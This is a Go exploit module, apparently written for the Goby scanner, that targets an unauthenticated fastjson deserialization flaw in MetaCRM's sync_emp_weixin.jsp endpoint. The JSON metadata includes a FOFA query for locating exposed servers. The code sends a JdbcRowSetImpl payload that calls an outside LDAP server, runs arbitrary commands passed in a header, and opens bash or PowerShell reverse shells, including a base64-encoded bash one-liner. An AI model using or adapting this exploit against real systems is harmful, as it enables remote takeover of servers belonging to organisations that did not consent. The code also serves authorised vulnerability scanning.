package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "MetaCRM /sync_emp_weixin.jsp Code Execution Vulnerability",
    "Description": "<p>MetaCRM is an intelligent platform CRM software that helps companies achieve management excellence by enhancing enterprise management and collaborative office, comprehensively improving enterprise management and operational efficiency. Meta Software pioneered the introduction of user-level product platform MetaCRM V5/V6 in the CRM field, and over the years has been continuing to create value for customers, significantly improving the degree of user needs to meet the satisfaction of the use of MetaCRM V5/V6. For the growing enterprises, Meta Software has developed the product \"MetaCRM\" for small and medium-sized enterprises with advanced CRM products and technologies, as well as the online CRM system for cloud computing. </p><p>Metric CRM /sync_emp_weixin.jsp interface uses a vulnerable component, an unauthenticated remote attacker can launch an attack on Metric CRM through the fastjson serialization vulnerability, execute arbitrary code and obtain server privileges.</p>",
    "Product": "MetaCRM6",
    "Homepage": "http://www.metasoft.com.cn/technology/index.html",
    "DisclosureDate": "2024-10-30",
    "PostTime": "2024-10-30",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/common/scripts/basic.js\" && body=\"/indexbusiness.jsp\"",
    "GobyQuery": "body=\"/common/scripts/basic.js\" && body=\"/indexbusiness.jsp\"",
    "Level": "3",
    "Impact": "<p>Metric CRM /sync_emp_weixin.jsp interface uses a vulnerable component, an unauthenticated remote attacker can launch an attack on Metric CRM through the fastjson serialization vulnerability, execute arbitrary code and obtain server privileges.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/2401_88531218/article/details/143363256"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByBashBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "美特CRM /sync_emp_weixin.jsp 代码执行漏洞",
            "Product": "美特软件-MetaCRM6",
            "Description": "<p>MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特软件开创性地在CRM领域中引入用户级产品平台MetaCRM V5/V6，多年来一直在持续地为客户创造价值，大幅提升了用户需求满足度与使用的满意度。针对成长型企业，美特软件用先进的CRM产品与技术，开发了适合中小型企业的产品“美客宝”，以及面向云计算的在线CRM系统。<br></p><p>美特CRM /sync_emp_weixin.jsp接口处使用存在漏洞组件，未经身份验证的远程攻击者可通过fastjson&nbsp;序列化漏洞对美特CRM发起攻击，执行任意代码并可获取服务器权限。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>美特CRM /sync_emp_weixin.jsp接口处使用存在漏洞组件，未经身份验证的远程攻击者可通过fastjson&nbsp;序列化漏洞对美特CRM发起攻击，执行任意代码并可获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "MetaCRM /sync_emp_weixin.jsp Code Execution Vulnerability",
            "Product": "MetaCRM6",
            "Description": "<p>MetaCRM is an intelligent platform CRM software that helps companies achieve management excellence by enhancing enterprise management and collaborative office, comprehensively improving enterprise management and operational efficiency. Meta Software pioneered the introduction of user-level product platform MetaCRM V5/V6 in the CRM field, and over the years has been continuing to create value for customers, significantly improving the degree of user needs to meet the satisfaction of the use of MetaCRM V5/V6. For the growing enterprises, Meta Software has developed the product \"MetaCRM\" for small and medium-sized enterprises with advanced CRM products and technologies, as well as the online CRM system for cloud computing.&nbsp;</p><p>Metric CRM /sync_emp_weixin.jsp interface uses a vulnerable component, an unauthenticated remote attacker can launch an attack on Metric CRM through the fastjson serialization vulnerability, execute arbitrary code and obtain server privileges.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Metric CRM /sync_emp_weixin.jsp interface uses a vulnerable component, an unauthenticated remote attacker can launch an attack on Metric CRM through the fastjson serialization vulnerability, execute arbitrary code and obtain server privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`
	setPayloadRequestHashsancbagscasbvkcjgafeajgsdtabtdysgvacgsavvcagvcsavtefevgaydc := func(hostInfo *httpclient.FixUrl, cmd string) (string, string, error) {
		payload := `[{%22@type%22:%22[com.sun.rowset.JdbcRowSetImpl%22[{,%22dataSourceName%22:%22ldap://` + godclient.GetGodServerIP() + `/A4%22,%22autoCommit%22:true}]`
		loopholesRequestConfig := httpclient.NewGetRequestConfig("/weixin/admin/sync_emp_weixin.jsp?emp_json=" + payload)
		loopholesRequestConfig.FollowRedirect = false
		loopholesRequestConfig.VerifyTls = false
		loopholesRequestConfig.Header.Store("cmd", cmd)
		resp, err := httpclient.DoHttpRequest(hostInfo, loopholesRequestConfig)
		if err != nil {
			return "", "", err
		}
		url := "/weixin/admin/sync_emp_weixin.jsp"
		return resp.Utf8Html, url, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashsancbagscasbvkcjgafeajgsdtabtdysgvacgsavvcagvcsavtefevgaydc

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashsancbagscasbvkcjgafeajgsdtabtdysgvacgsavvcagvcsavtefevgaydc

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)
				Result = strings.Split(Result, "{\"m")[0]

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
